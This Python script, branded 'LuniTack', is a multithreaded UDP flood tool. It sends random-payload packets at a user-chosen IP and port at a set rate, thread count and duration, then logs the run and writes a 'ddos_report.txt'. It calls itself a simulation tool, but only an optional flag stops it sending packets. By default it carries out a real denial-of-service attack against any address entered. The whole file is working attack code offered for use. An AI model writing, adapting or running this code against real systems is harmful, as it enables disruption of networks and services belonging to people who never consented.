import socket
import threading
import random
import time
import sys
import logging
import psutil
from datetime import datetime
from tqdm import tqdm
import argparse

logging.basicConfig(filename="ddos_simulation.log", level=logging.INFO, format="%(asctime)s - %(message)s")
console = logging.StreamHandler()
console.setLevel(logging.INFO)
logging.getLogger().addHandler(console)

def perform_attack(target_ip, target_port, duration, rate_limit, payload_size, total_sent, lock):
    timeout = time.time() + duration
    sent = 0

    with tqdm(total=duration * rate_limit, desc="Sending packets") as pbar:
        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = random._urandom(payload_size)
                sock.sendto(payload, (target_ip, target_port))
                sent += 1
                with lock:
                    total_sent[0] += 1
                pbar.update(1)
                time.sleep(1 / rate_limit)
            except socket.error as sock_err:
                logging.error(f"Socket error: {sock_err}")
            except Exception as e:
                logging.error(f"Unexpected error: {e}")
            finally:
                sock.close()

    print(f"\n[INFO] Attack on {target_ip}:{target_port} completed. Packets sent by thread: {sent}")
    logging.info(f"Attack on {target_ip}:{target_port} completed. Packets sent by thread: {sent}")

def validate_ip(ip):
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        if not part.isdigit() or not (0 <= int(part) <= 255):
            return False
    return True

def check_system_resources():
    cpu_usage = psutil.cpu_percent()
    if cpu_usage > 80:
        print("[WARNING] High CPU usage detected. Proceed with caution.")
    memory = psutil.virtual_memory()
    if memory.percent > 80:
        print("[WARNING] High memory usage detected. Proceed with caution.")

def main():
    print("\n" + "="*50)
    print("LuniTack: The Ultimate Simulation Tool")
    print("Powered by Lunity")
    print("="*50 + "\n")

    parser = argparse.ArgumentParser(description="LuniTack Simulation Tool")
    parser.add_argument("--ip", help="Target IP address")
    parser.add_argument("--port", type=int, help="Target port")
    parser.add_argument("--duration", type=int, help="Duration of the attack in seconds")
    parser.add_argument("--threads", type=int, help="Number of threads")
    parser.add_argument("--rate", type=int, default=100, help="Packets per second rate limit")
    parser.add_argument("--simulate", action="store_true", help="Enable simulation mode (no packets will be sent)")
    parser.add_argument("--payload", type=int, default=1024, help="Payload size in bytes")
    args = parser.parse_args()

    if not args.ip or not args.port or not args.duration or not args.threads:
        target_ip = input("Enter Target IP: ").strip()
        target_port = int(input("Enter Target Port (1-65535): ").strip())
        duration = int(input("Enter Duration (in seconds): ").strip())
        threads_count = int(input("Enter Number of Threads: ").strip())
        rate_limit = int(input("Enter Packets per Second Rate Limit: ").strip() or 100)
        payload_size = int(input("Enter Payload Size in Bytes (default 1024): ").strip() or 1024)
        simulate = input("Enable Simulation Mode? (yes/no): ").strip().lower() == "yes"
    else:
        target_ip = args.ip
        target_port = args.port
        duration = args.duration
        threads_count = args.threads
        rate_limit = args.rate
        simulate = args.simulate
        payload_size = args.payload

    if not validate_ip(target_ip):
        print("[ERROR] Invalid IP address format.")
        sys.exit(1)

    if not (1 <= target_port <= 65535):
        print("[ERROR] Port number must be between 1 and 65535.")
        sys.exit(1)

    if duration <= 0:
        print("[ERROR] Duration must be a positive integer.")
        sys.exit(1)

    if threads_count <= 0:
        print("[ERROR] Threads count must be a positive integer.")
        sys.exit(1)

    if rate_limit <= 0:
        print("[ERROR] Rate limit must be a positive integer.")
        sys.exit(1)

    if payload_size <= 0:
        print("[ERROR] Payload size must be a positive integer.")
        sys.exit(1)

    if simulate:
        print("[INFO] Simulation mode enabled. No packets will be sent.")
        logging.info("Simulation mode enabled. No packets sent.")
        return

    check_system_resources()

    start_time = datetime.now()
    print(f"\n[INFO] Starting attack on {target_ip}:{target_port} for {duration} seconds with {threads_count} threads at {rate_limit} packets/second.")
    print(f"[INFO] Attack started at {start_time.strftime('%Y-%m-%d %H:%M:%S')}.")
    logging.info(f"Attack started on {target_ip}:{target_port} for {duration} seconds with {threads_count} threads at {rate_limit} packets/second.")

    lock = threading.Lock()
    total_sent = [0]

    threads = []
    for _ in range(threads_count):
        thread = threading.Thread(target=perform_attack, args=(target_ip, target_port, duration, rate_limit, payload_size, total_sent, lock))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    end_time = datetime.now()
    print(f"[INFO] Attack completed at {end_time.strftime('%Y-%m-%d %H:%M:%S')}. Duration: {(end_time - start_time).total_seconds()} seconds.")
    logging.info(f"Attack completed at {end_time.strftime('%Y-%m-%d %H:%M:%S')}. Duration: {(end_time - start_time).total_seconds()} seconds.")

    with open("ddos_report.txt", "w") as report:
        report.write(f"Target: {target_ip}:{target_port}\n")
        report.write(f"Duration: {duration} seconds\n")
        report.write(f"Threads: {threads_count}\n")
        report.write(f"Rate Limit: {rate_limit} packets/second\n")
        report.write(f"Payload Size: {payload_size} bytes\n")
        report.write(f"Total Packets Sent: {total_sent[0]}\n")

if __name__ == "__main__":
    main()
